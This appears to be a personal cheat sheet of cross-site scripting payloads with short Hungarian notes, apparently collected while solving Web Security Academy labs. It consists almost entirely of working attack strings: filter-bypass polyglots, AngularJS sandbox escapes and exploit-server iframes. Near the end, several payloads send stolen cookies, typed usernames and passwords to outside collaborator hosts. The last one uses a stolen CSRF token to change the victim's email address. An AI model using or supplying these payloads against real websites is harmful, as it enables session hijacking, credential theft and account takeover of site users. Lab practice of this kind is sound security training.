<><SCript>alert(1)</SCript>


"><svg onload=alert(1)>


<img src=1 onerror=alert(1)>

commentben:
<><img src=1 onerror=alert(1)>

javascript:alert(document.cookie)


exploit serverbe:
<iframe src="https://0a18008d03221cf38046036c00c20021.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>


jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert("letesztelni") )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert("letesztelni")//>\x3e


jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(document['cookie']) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(document['cookie'])//>\x3e


"></select>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert("letesztelni") )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert("letesztelni")//>\x3e


"onmouseover="alert(1)


{{constructor.constructor('alert(1)')()}}


{{$on.constructor('alert(1)')()}}


\"-alert(1)}//


<xss id=x tabindex=1 onfocus=alert(1)><


jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(2)//>\x3ea
<><img src=1 onerror=alert(3)>


<><img src=1 onerror=alert(1)>


exploit serverbe:
<script>
location = 'https://0add00df0415f10881e16b000075005b.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>


exploit serverbe:
<iframe src="https://0ae800cc04eb684982872ac0006500e6.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=document.location=`https://exploit-0a32008804f9687e82932985016800df.exploit-server.net/?kookie=`+document.cookie%3E" onload=this.style.width='100px'>


httéps://blablabla.net/ után:
?'accesskey='x'onclick='alert(1)


httéps://blablabla.net/?search= után:
%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E


\'-alert(1)//


</script><script>alert(1)</script>


Website mezőben:
http://foo?&apos;-alert(1)-&apos;


${alert(1)}


commentben:
<script>
    fetch('https://xyzbptj5cccuj168v3n6d8yklbr2ft3i.oastify.com', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
</script>


commentben:
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://rid59n3zw6wo3vq2fx70x2ie55bwzond.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">


commentben:
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
